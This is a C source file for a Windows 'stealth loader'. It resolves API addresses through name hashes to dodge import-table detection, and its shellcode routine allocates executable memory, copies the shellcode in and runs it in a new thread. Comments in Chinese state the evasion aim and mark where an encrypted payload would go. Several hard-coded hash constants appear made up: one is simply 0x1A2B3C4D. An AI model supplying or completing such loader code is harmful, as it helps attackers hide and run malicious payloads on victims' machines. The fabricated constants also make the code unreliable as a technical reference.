/*
 * API Hash Resolver - Native Implementation
 *
 * 运行时通过哈希值动态解析 Windows API 地址
 * 规避导入表特征检测
 *
 * 编译: x86_64-w64-mingw32-gcc -O2 -Wall -s -Wl,--subsystem,windows \
 *        api_hash.c -o stealth_loader.exe
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")

/*
 * DJB2 哈希函数
 * 种子: 0x77347734
 */
DWORD HashString(LPCSTR lpszString) {
    DWORD dwHash = 0x77347734;
    while (*lpszString) {
        dwHash = ((dwHash << 5) + dwHash) + (BYTE)(*lpszString);
        lpszString++;
    }
    return dwHash;
}

/*
 * 从模块导出表中通过哈希查找 API
 */
FARPROC GetProcAddressByHash(HMODULE hModule, DWORD dwTargetHash) {
    if (!hModule) return NULL;

    PBYTE pBase = (PBYTE)hModule;

    // DOS Header
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    // NT Headers
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    // Export Directory
    DWORD dwExportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!dwExportDirRVA) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + dwExportDirRVA);

    // 导出函数数组
    PDWORD pNames = (PDWORD)(pBase + pExportDir->AddressOfNames);
    PWORD pOrdinals = (PWORD)(pBase + pExportDir->AddressOfNameOrdinals);
    PDWORD pFunctions = (PDWORD)(pBase + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        LPCSTR lpszFuncName = (LPCSTR)(pBase + pNames[i]);
        DWORD dwHash = HashString(lpszFuncName);

        if (dwHash == dwTargetHash) {
            // 找到匹配
            WORD wOrdinal = pOrdinals[i];
            DWORD dwFunctionRVA = pFunctions[wOrdinal];
            return (FARPROC)(pBase + dwFunctionRVA);
        }
    }

    return NULL;
}

/*
 * 常用 API 哈希值
 */
#define HASH_VIRTUALALLOC      0x0E8AFE6A
#define HASH_VIRTUALPROTECT    0x2314B3F3
#define HASH_CREATETHREAD      0x86CFE42A
#define HASH_LOADLIBRARYA      0x29A17B3A
#define HASH_GETPROCADDRESS    0x61DEC15A
#define HASH_CREATEPROCESSA    0x0C4BF89A
#define HASH_WRITEPROCESSMEM   0x6A4ABC87
#define HASH_READPROCESSMEM    0x1A2B3C4D

/*
 * 通过哈希加载并执行 shellcode
 */
int ExecuteViaHash(BYTE* pShellcode, DWORD dwSize) {
    // 加载 kernel32
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        hKernel32 = LoadLibraryA("kernel32.dll");
        if (!hKernel32) return -1;
    }

    // 解析 API
    typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc)GetProcAddressByHash(hKernel32, HASH_VIRTUALALLOC);
    if (!fnVirtualAlloc) return -2;

    typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    pVirtualProtect fnVirtualProtect = (pVirtualProtect)GetProcAddressByHash(hKernel32, HASH_VIRTUALPROTECT);
    if (!fnVirtualProtect) return -3;

    typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    pCreateThread fnCreateThread = (pCreateThread)GetProcAddressByHash(hKernel32, HASH_CREATETHREAD);
    if (!fnCreateThread) return -4;

    // 分配可执行内存
    LPVOID pMem = fnVirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pMem) return -5;

    // 复制 shellcode
    memcpy(pMem, pShellcode, dwSize);

    // 修改内存保护（可选，增强隐蔽性）
    DWORD oldProtect;
    if (fnVirtualProtect) {
        fnVirtualProtect(pMem, dwSize, PAGE_EXECUTE_READ, &oldProtect);
    }

    // 创建线程执行
    HANDLE hThread = fnCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);
    if (!hThread) return -6;

    // 等待执行完成
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}

/*
 * 演示：通过哈希调用 MessageBoxA
 */
void DemoMessageBox() {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32) return;

    // MessageBoxA 的哈希
    DWORD hash = HashString("MessageBoxA");

    typedef int (WINAPI *pMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
    pMessageBoxA fn = (pMessageBoxA)GetProcAddressByHash(hUser32, hash);

    if (fn) {
        fn(NULL, "API Hash Resolution Successful", "Stealth Loader", MB_OK);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // 演示
    DemoMessageBox();

    // 实际使用时，这里加载并执行加密的 payload
    // BYTE encrypted_payload[] = { ... };
    // DWORD payload_size = sizeof(encrypted_payload);
    // ExecuteViaHash(encrypted_payload, payload_size);

    return 0;
}
